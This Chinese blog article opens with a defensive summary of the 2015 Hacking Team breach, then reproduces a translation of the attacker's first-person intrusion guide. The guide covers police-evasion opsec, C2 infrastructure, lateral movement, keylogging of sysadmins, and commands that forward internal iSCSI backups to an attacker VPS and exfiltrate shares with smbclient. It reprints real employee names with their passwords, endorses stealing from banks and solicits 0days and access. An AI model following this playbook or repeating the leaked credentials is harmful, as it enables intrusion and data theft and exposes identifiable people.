---
slug: /hack-back-hacking-team
title: 反击安全公司Hacking Team
---

**专门从事网络监控业务的安全公司，自身却成为被入侵的对象。** 2015年7月5日，意大利间谍软件公司Hacking Team超过400GB数据通过其官方Twitter账号公开泄露，内容涵盖员工账号密码、电子邮件、客户信息和源代码。攻击者Phineas Fisher随后发布了详尽的攻击复盘，完整还原了入侵路径、利用的漏洞和攻击动机。


#### Hacking Team APT事件关键步骤与安全启示

Phineas Fisher对Hacking Team的入侵是一系列精心策划的步骤，其手法还是比较专业的。对于甲方安全建设有很强的启示作用，以下为主要入侵动作以及对甲方安全建设的启示。

1. **互联网暴露面探测** ：Phineas Fisher通过寻找HackingTeam互联网暴露面，发现了一个Joomla博客、电子邮件服务器和一些嵌入式设备。
  - **安全启示：掌握自己互联网暴露面至关重要。** 尤其是其中的通用框架、通用服务、非标软件等需要重点进行收敛。
2. **嵌入式设备漏洞利用** ：选择了一个嵌入式设备，并通过逆向找到了一个RCE漏洞。编写了带后门的固件，内置了一些安全工具，并利用该漏洞安装。
  - **安全启示：互联网边界服务0day防御是不可绕过的问题** 。防御这个互联网突破点非常困难，一方面是这类嵌入式设备往往是采购的三方供应链，往往是没有源码的硬件设备。在一定需要面向互联网访问的前提下，如何防御0day漏洞是一个非常难解决的问题。
3. **网络扫描与监听** ：控制了嵌入式设备，开始扫描HackingTeam的内部网络并监听流量。
  - **安全启示：不能放过内部任何扫描探测行为。**
4. **发现不需要认证的MongoDB** ：发现了默认不需要认证的MongoDB，这些数据库实例包含了RCS软件测试实例的监控音频和内部文档。
  - **安全启示：任何服务不得未认证即可访问。** 哪怕仅开放在内部网络中，也不应该不设置账号密码即可访问数据库等服务。无论是内鬼还是边界被突破，这种无需认证即可访问的服务都是攻击者最喜欢的目标。
5. **拿到备份数据：访问iSCSI设备** ：通过Nmap发现了HackingTeam子网中的iSCSI网络存储设备。他端口转发这些设备并将它们挂载到他控制的VPS上。**挂载Exchange服务器** ：在系统内部，发现了包括公司Exchange Server在内的多个虚拟机备份，并远程挂载。
  - **安全启示：离线备份的保管优先级更高。** 很多企业由于职责划分的原因，离线备份往往是运维或SRE团队负责。而这些事情往往在开始的那一刻配置完成后，就几乎没有增量的需求。导致往往被遗忘，而安全团队则聚焦在那些频繁暴露的风险上，忽视了最容易出问题的数据备份安全。
6. **提取密码** ：从虚拟机备份的注册表配置单元中使用creddump7提取密码，包括仍然有效的本地管理员账户的凭据。**获得域管理员控制权** ：由于作为域管理员获得了访问权限，他开始通过PowerShell下载电子邮件。
  - **安全启示：超级管理员需要专项保障。**
7. **网络横向移动** ：利用mimikatz从内存中窃取密码，并在网络中横向移动到另外一个网络隔离电脑上。
8. **监视系统管理员** ：在系统管理员的机器上安装了键盘记录器和屏幕抓取工具。等待管理员挂载Truecrypt卷，然后复制了文件。
9. **获取源代码** ：使用通过Truecrypt驱动器获得的密码，在本地git服务器上找到源代码。还通过访问HackingTeam的邮件服务器，利用“忘记密码”功能控制了Twitter和GitLab账户。
10. **数据泄露** ：最终披露了所有收集到的数据，包括电子邮件、内部文件和软件源代码。

**这次攻击的完整路径揭示了一个反常现象：专业安全公司反而成为最容易被入侵的目标之一。** 安全公司的核心业务是对外输出攻防能力，但这恰恰使其内部防御陷入两个结构性困境：一是研发投入优先流向产品而非自身系统，导致内部基础设施长期处于低防护状态；二是员工因长期从事安全工作，往往产生过度自信，对内部网络的信任假设过于宽松。Hacking Team的备份未隔离、MongoDB未设认证、密码在多系统复用，都是这种自信心理的具体表现。此外，安全公司员工之间的高度信任关系，使得横向移动一旦获得立足点便几乎畅通无阻。

#### 事件影响与后续

**泄露数据将 Hacking Team 的政府客户名单彻底曝光，其中不乏人权记录极差的国家。** 内部邮件和财务记录显示，埃塞俄比亚、巴林、埃及、哈萨克斯坦、摩洛哥、俄罗斯、沙特阿拉伯、苏丹、阿塞拜疆、土耳其等国的政府机构均是其客户。美国联邦调查局和禁毒局同样出现在客户列表中。更为直接的证据则来自已被曝光的监控案例——公民实验室（Citizen Lab）在旅居美国弗吉尼亚州北部的埃塞俄比亚记者电脑上确认了 Hacking Team 间谍软件的存在；记者和活动人士的设备上反复出现该工具的踪迹。Hacking Team 首席执行官 Vincenzetti 在邮件中对人权批评的回应是轻蔑和不以为然，内部讨论则明确显示，一旦被迫切断与争议客户的合作，收入损失是他们最担心的事。

**泄露数据中包含多个 Adobe Flash 的未修补漏洞，随即被漏洞利用工具包大规模武器化。** 其中 CVE-2015-5119 是一个释放后重用漏洞，存在于当时最新版本的 Flash 中。漏洞细节和利用代码公开后，Neutrino、Angler、Nuclear 等主流漏洞利用工具包在极短时间内完成集成，并将勒索软件等恶意载荷作为投递目标。Metasploit 也在随后发布了相应模块。安全研究人员将其描述为"有据可查的最快速武器化案例之一"，根本原因在于 Hacking Team 的内部代码注释详细、即拿即用。同一数据包中还另含两个 Flash 0day，均随后被发现在野利用。

**Hacking Team 在泄露事件中遭受的打击是结构性的，而非一时的声誉危机。** 数据泄露后，意大利当局就入侵事件展开调查，但调查法官最终以"无线索可循"为由关闭案件。公司层面，政府客户从泄露前的逾四十家锐减至寥寥数家，大量员工离职。2019 年，一位名叫 Lezzi 的投资人以象征性的一欧元价格收购了 Hacking Team，并将其更名为 Memento Labs，试图重建市场信任。然而公司在重组后持续流失员工，客源难以恢复。2025 年，Memento Labs 的商业间谍软件 Dante 被研究人员在针对俄罗斯和白俄罗斯系统的攻击中识别，公司 CEO 随即公开确认该软件属于其公司。

**这次事件被部分观察者称为"监控行业的斯诺登时刻"，但它并未从根本上终结商业监控软件产业。** 泄露内容直接证明，这一行业在毫无有效监管的环境下全球扩张，国际出口管制形同虚设——欧盟虽然于泄露事件发生当年开始实施出口管制，但 Hacking Team 内部邮件显示，其所谓的合规审查仅是委托一家律所挂名，从未对每笔交易进行实质性审核。泄露事件直接推动了公民社会和学术机构对商业间谍软件问题的持续关注，Citizen Lab 等机构的研究路径也因此获得更多国际关注。

**Phineas Fisher 在 Hacking Team 事件之后并未收手，持续以黑客行动主义者的身份行动。** 2016 年，西班牙加泰罗尼亚警察工会（Sindicat De Mossos d'Esquadra）遭到入侵，大量警察个人信息被泄露，此后西班牙当局以与 Fisher 相关的罪名逮捕了数人，但 Fisher 本人随即通过邮件声明否认自己被捕。2019 年，大量来自开曼群岛国家银行与信托的数据经由 DDoSecrets 发布，Fisher 公开承认这批数据由其提供，并声称实际入侵发生于 2016 年，所得资金已转赠他人。同年，Fisher 还设立了一个面向黑客行动主义者的赏金计划，向成功入侵并披露企业或政府信息的匿名黑客提供奖励。截至目前，其真实身份从未被公开确认。

#### 1、引言

您会注意到自上一版以来语言的变化。英语世界已经有大量关于黑客、谈话、指南和信息。在那个世界里，有许多比我更优秀的黑客，但他们滥用他们的才能为“国防”承包商、情报机构工作，保护银行和公司，维护现状。黑客文化在美国作为一种反文化诞生，但那种起源只剩下它的美学 – 其余的已被同化。至少他们可以穿T恤，染蓝头发，使用他们的黑客名字，感觉像叛逆者，同时为老板工作。 你过去必须潜入办公室才能泄露文件。过去抢劫银行需要枪。现在你可以在床上拿着笔记本电脑做这两件事（[APT-Carbanak](https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf)）。正如CNT在Gamma Group黑客行动后所说：“让我们用新的斗争形式向前迈进”。黑客是一个强大的工具，让我们学习并战斗！

#### 2、Hacking Team

Hacking Team是一家帮助政府黑客攻击和监视记者、活动人士、政治反对派以及其他威胁他们权力的人的公司。偶尔，他们也会攻击真正的罪犯和恐怖分子。Vincenzetti，首席执行官，喜欢在他的电子邮件末尾加上法西斯口号”boia chi molla”。更准确地说应该是”boia chi vende RCS”。他们还声称拥有解决Tor和暗网所带来的“问题”的技术。但考虑到我还自由自在，我对其有效性表示怀疑。

#### 3、保持安全

**攻击者的隐蔽策略，是甲方检测体系建设的逆向参照系。** 理解攻击者如何抹除流量特征、切断溯源链条，是构建有效检测能力的前提。以下内容整理自攻击者视角的匿名化操作实践，其中每一项技术背后，都对应着一个防御侧的检测盲区：Tor 出口节点流量与正常 HTTPS 的混淆意味着纯基于 IP 的封锁几乎无效；中继跳板服务器的使用意味着攻击 IP 与真实控制端之间存在多跳解耦；新注册基础设施和比特币匿名支付意味着传统 IOC（入侵指标）的时效性极短。甲方在规划流量审计、异常行为检测和溯源能力时，需要将这些反侦察手段纳入威胁模型。

不幸的是，我们的世界是颠倒的。做坏事能发财，做好事却会进监狱。幸运的是，多亏了像[Tor项目](https://www.torproject.org/)这样辛勤工作的人，你可以通过采取一些简单的预防措施避免进监狱：

- 1) 加密你的硬盘，我猜当警察来没收你的电脑时，意味着你已经犯了很多错误，但最好还是安全一些。
- 2) 使用虚拟机，并通过Tor路由所有流量 这实现了两件事。首先，你的所有流量通过Tor进行匿名化。其次，将你的个人生活和你的黑客活动放在不同的电脑上，有助于你不小心混淆它们。 你可以使用诸如[Whonix](https://www.whonix.org/)、[Tails](https://tails.boum.org/)、[Qubes TorVM](https://www.qubes-os.org/doc/privacy/torvm/)或[自定义方案](https://trac.torproject.org/projects/tor/wiki/doc/TransparentProxy)。有一个[详细的比较](https://www.whonix.org/wiki/Comparison_with_Others)。
- 3) （可选）不直接连接到Tor Tor不是万能药。他们可以通过你连接Tor的时间与你的黑客昵称活跃的时间进行相关联。此外，还曾有过[对Tor的成功攻击](https://blog.torproject.org/blog/tor-security-advisory-relay-early-traffic-confirmation-attack/)。你可以使用其他人的wifi连接到Tor。[Wifislax](http://www.wifislax.com/)是一个带有大量破解wifi工具的Linux发行版。另一个选择是在连接到Tor之前先连接到VPN或[桥接节点](https://www.torproject.org/docs/bridges.html.en)，但这种方法不够安全，因为他们仍然可以将黑客活动与你家的[互联网活动相关联](http://www.documentcloud.org/documents/1342115-timeline-correlation-jeremy-hammond-and-anarchaos.html)（这被用作对Jeremy Hammond的证据）。 现实是，尽管Tor并非完美，但它运作得相当好。当我年轻且鲁莽时，我做了很多不采取任何保护措施的事情（我指的是黑客活动），除了使用Tor，警方尽了最大努力进行调查，但我从未遇到任何问题。

##### 3.1 基础设施

我不会直接从Tor出口节点进行黑客活动。它们被列入黑名单，速度慢，无法接收反向连接。Tor保护我的匿名性，同时我连接到用于黑客活动的基础设施，这包括：

- 1) 域名 用于C&C（命令与控制）地址，以及保证出口通信的DNS通道。
- 2) 稳定的服务器 用作C&C服务器，接收反向Shell，发起攻击，以及存储赃物。
- 3) 被黑的服务器 用作中继点来隐藏稳定服务器的IP地址。当我想要快速连接而不用中继时，例如进行端口扫描、扫描整个互联网、使用SQL注入下载数据库等，也会使用这些服务器。 当然，你必须使用匿名支付方式，比如比特币（如果小心使用）。

##### 3.2 问题原因

我们经常在新闻中看到攻击被追踪到政府支持的黑客组织（”APT”）的报道，因为他们反复使用相同的工具，留下相同的痕迹，甚至使用相同的基础设施（域名、电子邮件等）。他们之所以如此粗心大意，是因为他们可以在没有法律后果的情况下进行黑客活动。 我不想通过将我对Hacking Team的黑客行为与我做过的其他黑客行为或我日常工作中使用的名字联系起来，让警方的工作变得更容易。所以，我使用了新的服务器和域名，使用新的电子邮件注册，并用新的比特币地址支付。此外，我只使用了公开可用的工具，或者我专门为这次攻击编写的东西，并改变了我做某些事情的方式，以避免留下我通常的法医痕迹。

#### 4、进入网络

有多种方法可以获得一个立足点。由于我用于攻击Hacking Team的方法不常见，并且比通常需要的工作量大得多，所以我将讨论两种最常见的方法，我建议首先尝试它们。

##### 4.1 社会工程学

社会工程学，特别是针对性的网络钓鱼，是如今大多数黑客行动的主要原因。[了解以往一代人的社会工程学壮举的趣闻](http://www.netcomunity.com/lestertheteacher/doc/ingsocial1.pdf)。我不想尝试对Hacking Team进行网络钓鱼，因为他们的整个业务就是帮助政府对付他们的对手，所以他们更有可能认出并调查网络钓鱼企图。

##### 4.2 购买访问权限

多亏了辛勤工作的俄罗斯人及其漏洞利用工具包、流量销售商和僵尸网络牧羊人，许多公司网络内已经有了受到感染的计算机。几乎所有财富500强公司都有一些已在内部的僵尸网络。然而，Hacking Team是一个非常小的公司，而且它的大多数员工是信息安全专家，所以他们已经被感染的可能性很低。

##### 4.3 利用技术漏洞

在Gamma Group黑客攻击之后，我描述了[搜索漏洞的过程](http://pastebin.com/raw.php?i=cRYvK4jb)。Hacking Team有一个公开的IP范围： inetnum: 93.62.139.32 – 93.62.139.47 descr: HT公共子网Hacking Team对外网暴露的内容很少。例如，不像Gamma Group，他们的客户支持网站需要客户端证书才能连接。他们拥有的是他们的主网站（一个Joomla博客，其中Joomscan没有发现任何严重问题）、邮件服务器、几个路由器、两个VPN设备和一个垃圾邮件过滤设备。所以，我有三个选择：在Joomla中寻找一个0day，寻找postfix中的一个0day，或者在其中一个嵌入式设备中寻找一个0day。嵌入式设备中的0day似乎是最简单的选择，经过两周的逆向工程工作，我得到了一个远程根漏洞。由于这些漏洞还没有被修复，我不会提供更多细节。

#### 5、做好准备

**在实际利用漏洞之前，攻击者的大量工作集中在工具准备和预演测试上。** 攻击者编写了带后门的固件，内置了完整的后渗透工具集，覆盖以下核心功能：网络扫描与服务指纹识别、Windows 域内网协议攻击（包括 NTLM 中毒、ARP 欺骗等）、流量嗅探与明文协议密码捕获、持久化反向 Shell 和端口转发、以及通过 SOCKS 代理将任意工具流量路由到内网。后门的存在是为了保护漏洞——只触发一次漏洞，此后通过后门进出，大幅降低漏洞被发现和修补的风险。在正式入侵前，攻击者还在其他存在同类漏洞的网络中进行了为期一周的实战测试，确认工具链稳定后才对 Hacking Team 发起攻击。

#### 6、观察和倾听

现在我已经进入了他们的内部网络，我想四处看看并思考下一步该做什么。我启动了Responder.py的分析模式（-A用于监听而不发送中毒响应），并用nmap进行了慢速扫描。

#### 7、NoSQL数据库

NoSQL，或者更确切地说，NoAuthentication，已经成为黑客社区的巨大礼物。就在我担心他们最终修补了MySQL中的所有身份验证绕过漏洞时，新的数据库流行起来，它们设计上不需要身份验证。Nmap在Hacking Team的内部网络中发现了一些这样的数据库：

```
27017/tcp open  mongodb       MongoDB 2.6.5
| mongodb-databases:
|   ok = 1
|   totalSizeMb = 47547
|   totalSize = 49856643072
...
|_    version = 2.6.5

27017/tcp open  mongodb       MongoDB 2.6.5
| mongodb-databases:
|   ok = 1
|   totalSizeMb = 31987
|   totalSize = 33540800512
|   databases
...
|_    version = 2.6.5
```

这些是RCS测试实例的数据库。RCS记录的音频存储在MongoDB中，使用GridFS。种子文件中的音频文件夹就来自这里。他们在不知不觉中监视了自己。

#### 8、一些杂乱的线索

虽然听取Hacking Team开发他们的恶意软件的录音和查看摄像头图像很有趣，但这并不是特别有用。真正打开他们大门的是他们不安全的备份。根据他们的文档，他们的iSCSI设备应该在一个单独的网络上，但nmap在他们的子网192.168.1.200/24中发现了一些：

```
# Nmap扫描报告ht-synology.hackingteam.local (192.168.200.66)
...
3260/tcp open  iscsi?
| iscsi-info:
|   Target: iqn.2000-01.com.synology:ht-synology.name
|     Address: 192.168.200.66:3260,0
|_    Authentication: No authentication required

# Nmap扫描报告synology-backup.hackingteam.local (192.168.200.72)
...
3260/tcp open  iscsi?
| iscsi-info:
|   Target: iqn.2000-01.com.synology:synology-backup.name
|     Address: 10.0.1.72:3260,0
|     Address: 192.168.200.72:3260,0
|_    Authentication: No authentication required

# 可以看到这是一个国产NAS品牌（Synology，群晖）
# 由于iSCSI需要一个内核模块，而且在嵌入式系统上编译它会很困难，我转发了端口，以便能够从VPS上挂载它：

# VPS
tgcd -L -p 3260 -q 42838
# 嵌入式系统
tgcd -C -s 192.168.200.72:3260 -c VPS_IP:42838

# VPS
iscsiadm -m discovery -t sendtargets -p 127.0.0.1

# 现在iSCSI找到了名称iqn.2000-01.com.synology，但因为它认为其IP是192.168.200.72而不是127.0.0.1，所以在挂载时出现了问题。

# 我解决它的方法是：
iptables -t nat -A OUTPUT -d 192.168.200.72 -j DNAT --to-destination 127.0.0.1

# 现在，经过：
iscsiadm -m node --targetname=iqn.2000-01.com.synology:synology-backup.name -p 192.168.200.72 --login

# ...设备文件出现了！我们挂载它：
vmfs-fuse -o ro /dev/sdb1 /mnt/tmp

# 并且发现了各种虚拟机的备份。Exchange服务器看起来最有趣。它太大了无法下载，但可以远程挂载来寻找有趣的文件：
$ losetup /dev/loop0 Exchange.hackingteam.com-flat.vmdk
$ fdisk -l /dev/loop0
/dev/loop0p1            2048  1258287103   629142528    7  HPFS/NTFS/exFAT

# 因此偏移量是2048 * 512 = 1048576
$ losetup -o 1048576 /dev/loop1 /dev/loop0
$ mount -o ro /dev/loop1 /mnt/exchange/

# 现在在/mnt/exchange/WindowsImageBackup/EXCHANGE/Backup 2014-10-14 172311
# 我们找到了VM的硬盘，并挂载它：
vdfuse -r -t VHD -f f0f78089-d28a-11e2-a92c-005056996a44.vhd /mnt/vhd-disk/
mount -o loop /mnt/vhd-disk/Partition1 /mnt/part1

# ...最终我们可以在/mnt/part1看到Exchange服务器的所有文件。
```

#### 9、从备份文件到域管理员

我在备份中最感兴趣的是，看看是否有可以用于访问实时服务器的密码或哈希。我在注册表配置单元上使用了[pwdump、cachedump和lsadump](https://github.com/Neohapsis/creddump7)。lsadump找到了besadmin服务账户的密码：

```
_SC_BlackBerry MDS Connection Service
0000   16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   62 00 65 00 73 00 33 00 32 00 36 00 37 00 38 00    b.e.s.3.2.6.7.8.
0020   21 00 21 00 21 00 00 00 00 00 00 00 00 00 00 00    !.!.!...........
```

**从备份文件到域管理员的跨越，依赖的是凭据复用这一普遍性弱点。** 通过对备份虚拟机注册表配置单元执行离线凭据提取，攻击者找到了服务账户的明文密码，随即通过 SMB 验证其有效性。密码仍然在用。利用横向移动工具获取落脚点后，再通过内存凭据抓取工具（从正在运行的进程内存中读取明文密码和哈希）拿到了包括域管理员在内的全量凭据：

```
HACKINGTEAM  BESAdmin       bes32678!!!
HACKINGTEAM  Administrator  uu8dd8ndd12!
HACKINGTEAM  c.pozzi        P4ssword      <---- lol great sysadmin
HACKINGTEAM  m.romeo        ioLK/(90
HACKINGTEAM  l.guerra       4luc@=.=
HACKINGTEAM  d.martinez     W4tudul3sp
HACKINGTEAM  g.russo        GCBr0s0705!
HACKINGTEAM  a.scarafile    Cd4432996111
HACKINGTEAM  r.viscardi     Ht2015!
HACKINGTEAM  a.mino         A!e$$andra
HACKINGTEAM  m.bettini      Ettore&Bella0314
HACKINGTEAM  m.luppi        Blackou7
HACKINGTEAM  s.gallucci     1S9i8m4o!
HACKINGTEAM  d.milan        set!dob66
HACKINGTEAM  w.furlan       Blu3.B3rry!
HACKINGTEAM  d.romualdi     Rd13136f@#
HACKINGTEAM  l.invernizzi   L0r3nz0123!
HACKINGTEAM  e.ciceri       2O2571&2E
HACKINGTEAM  e.rabe         erab@4HT!
```

#### 10、下载邮件

有了域管理员密码，我就可以访问公司的电子邮件，这是公司的心脏。因为我每采取一步行动都有被发现的风险，所以在继续探索之前，我开始下载他们的电子邮件。Powershell使这变得很容易。

有趣的是，我发现了Powershell在处理日期时的一个bug。在下载了邮件之后，我又花了几周时间才能访问源代码和其他一切，所以我不时返回下载新邮件。服务器位于意大利，日期格式为日/月/年。我使用了： -ContentFilter {(Received -ge ’05/06/2015′) -or (Sent -ge ’05/06/2015′)} 与New-MailboxExportRequest一起下载新邮件（在这个例子中，是自2015年6月5日以来的所有邮件）。问题是，如果你尝试一个大于12的日子，它会说日期无效（我想是因为在美国月份在前，你不能有一个大于12的月份）。看来微软的工程师只在他们自己的区域设置下测试他们的软件。

#### 11、下载文件

现在我已经获得了域管理员权限，我开始使用我的代理和smbclient的-Tc选项下载文件共享，例如：`proxychains smbclient '//192.168.1.230/FAE DiskStation' \ -U 'HACKINGTEAM/Administrator%uu8dd8ndd12!' -Tc FAE_DiskStation.tar '*'`

我像这样下载了Amministrazione、FAE DiskStation和FileServer文件夹中的种子文件。

#### 12、黑客入侵Windows域简介

在继续讲述”weones culiaos”（Hacking Team）的故事之前，我应该提供一些关于黑客入侵Windows网络的一般知识。

##### 12.1 横向移动

**Windows 域环境的横向移动，本质上是凭据传递与信任关系的链式利用。** 远程执行需要目标机器上的本地管理员凭据或哈希。获取凭据最常见的方式是从已控计算机的内存中读取——Windows 在会话存续期间会在内存中缓存明文密码或可直接传递的哈希，这是整个横向移动体系的核心前提。权限提升则依赖对系统配置错误或已知漏洞的检测与利用。

远程移动：

- 1) psexec Windows网络上横向移动的老牌方法。你可以使用[psexec](https://technet.microsoft.com/en-us/sysinternals/psexec.aspx)、[winexe](https://sourceforge.net/projects/winexe/)、Metasploit的[psexec_psh](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh)、Powershell Empire的[invoke_psexec](http://www.powershellempire.com/?page_id=523)或Windows内置的”[sc](http://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/)“命令。对于Metasploit模块、Powershell Empire和[pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)，你只需要哈希，不需要密码。这是最通用的方法（它适用于任何开放445端口的Windows计算机），但也是最不隐蔽的。事件日志中会出现类型7045 “服务控制管理器”的事件。根据我的经验，黑客行动期间从未有人注意到，但它有助于调查人员事后拼凑黑客的行为。
- 2) WMI 最隐蔽的方法。所有Windows计算机都启用了WMI服务，但除了服务器外，默认情况下防火墙会阻止它。你可以使用[wmiexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py)、[pth-wmis](https://github.com/byt3bl33d3r/pth-toolkit)、Powershell Empire的invoke_wmi或Windows内置的[wmic](http://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/)。除了wmic外，所有这些工具都只需要哈希。
- 3)[PSRemoting](http://www.maquinasvirtuales.eu/ejecucion-remota-con-powershell/)默认情况下处于禁用状态，我不建议启用新协议。但如果系统管理员已经启用了它，它非常方便，尤其是如果你使用Powershell来做所有事情（你应该使用Powershell来做几乎所有事情，它将在Powershell 5和Windows 10中发生变化，但目前Powershell使得一切都在RAM中执行、避开杀毒软件，并留下较小的痕迹）
- 4) 计划任务 你可以使用at和schtasks在远程执行程序。它适用于psexec能工作的同样情况，并且也留下了众所周知的痕迹。
- 5) GPO 如果所有这些协议都
- 被禁用或被防火墙阻止，一旦你成为域管理员，你可以使用GPO（组策略对象）为用户提供登录脚本，安装msi，执行计划任务，或者像我们将要看到的那样，用GPO来启用WMI并打开防火墙。

“原地”移动：

1. 令牌窃取一旦你在某台计算机上获得管理员权限，你可以使用其他用户的令牌访问域内资源。执行这一操作的两个工具是[incognito](https://www.indetectables.net/viewtopic.php?p=211165)和mimikatz的token::*命令。
2. MS14-068你可以利用Kerberos中的验证错误生成域管理员票据。
3. 传递哈希如果你有某个用户的哈希，但他们没有登录，你可以使用sekurlsa::pth来获取该用户的票据。
4. 进程注入任何远程控制木马都可以注入到其他进程中。例如，在meterpreter和[pupy](https://github.com/n1nj4sec/pupy)中的migrate命令，或者PowerShell Empire中的[psinject](http://www.powershellempire.com/?page_id=273)命令。你可以注入到拥有你想要的令牌的进程中。
5. runas有时这非常有用，因为它不需要管理员权限。该命令是Windows的一部分，但如果你没有GUI，你可以使用[PowerShell](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1)。

##### 12.2 持久性

一旦你获得了访问权限，你会想保持它。实际上，持久性只对那些像Hacking Team这样针对活动人士和其他个人的混蛋来说是一个挑战。要黑入公司，持久性并不需要，因为公司从不休息。我总是使用Duqu 2风格的“持久性”，在几台高正常运行时间的服务器上执行RAM中的操作。万一它们都同时重启，我有密码和[金票](http://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/)作为备用访问方式。

##### 12.3 内部侦察

当前最佳的了解Windows网络的工具是[PowerView](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView)。阅读其作者写的一切[关于PowerView的文章](http://www.harmj0y.net/blog/tag/powerview/)是值得的，PowerShell本身也非常强大。由于还有许多Windows 2000和2003服务器没有PowerShell，你还需要了解[老式方法](https://www.youtube.com/watch?v=rpwrKhgMd7E)，使用像[netview.exe](https://github.com/mubix/netview)这样的程序或Windows内置的“net view”。我喜欢的其他技术有：

1. 下载文件名列表使用域管理员账户，你可以使用PowerView下载网络中所有文件名的列表：`Invoke-ShareFinderThreaded -ExcludedShares IPC$,PRINT$,ADMIN$ | select-string '^(.*) \t-' | %{dir -recurse $_.Matches[0].Groups[1] | select fullname | out-file -append files.txt}`稍后，你可以在闲暇时阅读它并选择要下载的文件。
2. 阅读电子邮件正如我们已经看到的，你可以使用PowerShell下载电子邮件，其中包含很多有用的信息。
3. 阅读SharePoint许多公司也在这里存储大量重要信息。也可以[使用PowerShell下载](https://blogs.msdn.microsoft.com/rcormier/2013/03/30/how-to-perform-bulk-downloads-of-files-in-sharepoint/)。
4. 活动目录其中包含了有关用户和计算机的许多有用信息。在成为域管理员之前，你已经可以使用PowerView和其他工具获取很多信息。获得域管理员权限后，你应该使用csvde或其他工具导出所有活动目录信息。
5. 监视员工我最喜欢的爱好之一是猎捕系统管理员。监视Christian Pozzi（Hacking Team的一名系统管理员）使我获得了一个Nagios服务器的访问权限，这个服务器可以访问RCS的源代码所在的开发网络。通过[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)中的Get-Keystrokes和Get-TimedScreenshot的简单组合，[nishang](https://github.com/samratashok/nishang)中的Do-Exfiltration，以及GPO，你可以监视任何员工，甚至整个域。

#### 13、狩猎系统管理员

通过阅读他们关于基础设施的文档，我看到我还漏掉了一些重要的内容——“Rete Sviluppo”，这是一个与RCS源代码隔离的网络。公司的系统管理员总是能够访问所有东西，所以我搜索了Mauro Romeo和Christian Pozzi的计算机，看看他们是如何管理Sviluppo网络的，以及是否有其他我应该调查的有趣系统。由于他们的计算机是Windows域的一部分，我已经获得了管理员访问权限，所以访问他们的计算机很简单。Mauro Romeo的计算机没有开放任何端口，所以我打开了WMI端口并执行了meterpreter。除了使用Get-Keystrokes和Get-TimeScreenshot进行键盘记录和屏幕抓取外，我还使用了Metasploit的许多/gather/模块，CredMan.ps1，并搜索了[有趣的文件](http://pwnwiki.io/#!presence/windows/find_files.md)。看到Pozzi有一个Truecrypt卷，我等到他挂载它然后复制了文件。许多人嘲笑Christian Pozzi的弱密码（以及普遍嘲笑Christian Pozzi，他提供了很多素材）。我把它们包含在泄露中作为一个虚假线索，也是为了嘲笑他。事实上，mimikatz和键盘记录器对所有密码都视为平等。

#### 14、过桥

在Christian Pozzi的Truecrypt卷中，有一个包含许多密码的文本文件。其中一个是用于完全自动化的Nagios服务器，该服务器可以访问Sviluppo网络以进行监控。我找到了我需要的桥梁。文本文件只有Web界面的密码，但有一个公开的代码执行漏洞（它是一个未经认证的漏洞，但需要至少有一个用户启动会话，我使用了文本文件中的密码）。

#### 15、重用和重置密码

阅读电子邮件时，我看到Daniele Milan授予git仓库的访问权限。我已经有了他的Windows密码，感谢mimikatz。我尝试在git服务器上使用它，它有效。然后我尝试了sudo，它也有效。对于gitlab服务器和他们的Twitter账户，我使用了“忘记密码”功能以及我对他们邮件服务器的访问权限来重置密码。

#### 16、结论

这就是全部所需的步骤来摧毁一家公司并停止其侵犯人权的行为。这就是黑客行为的美丽和不对称性：通过100小时的工作，一个人可以撤销一个数百万美元公司多年的努力。黑客给了弱者一次战斗并获胜的机会。

黑客指南通常以一个声明结束：这些信息仅用于教育目的，要成为一个道德的黑客，不要攻击你没有权限访问的系统等。我也会说同样的话，但是对“道德”黑客有一个更叛逆的概念。泄露文件、从银行挪用资金以及帮助普通人保护其计算机是道德的黑客行为。然而，大多数自称为“道德黑客”的人只是在帮助那些支付他们高咨询费的人加强安全，而这些人往往最应该被黑客攻击。

Hacking Team认为自己是激发意大利设计的一长串传人的一部分。我看到的是Vincenzetti，他的公司，他在警察、Carabinieri和政府中的同伙，是意大利法西斯主义长期传统的一部分。我想将这份指南献给在阿曼多·迪亚兹学校突袭中的受害者，以及所有被意大利法西斯分子流血的人。

#### 17、联系方式

发送给我网络钓鱼尝试、意大利语死亡威胁，以及给我0day或银行、公司、政府等内部的访问权限。

请仅发送加密电子邮件：[https://securityinabox.org/es/thunderbird_usarenigmail](https://securityinabox.org/es/thunderbird_usarenigmail)

[PGP公钥区块]

如果不是你，那会是谁？如果不是现在，又会是何时？

附：

- [How to took down HackingTeam](https://gist.github.com/jaredsburrows/9e121d2e5f1147ab12a696cf548b90b0)
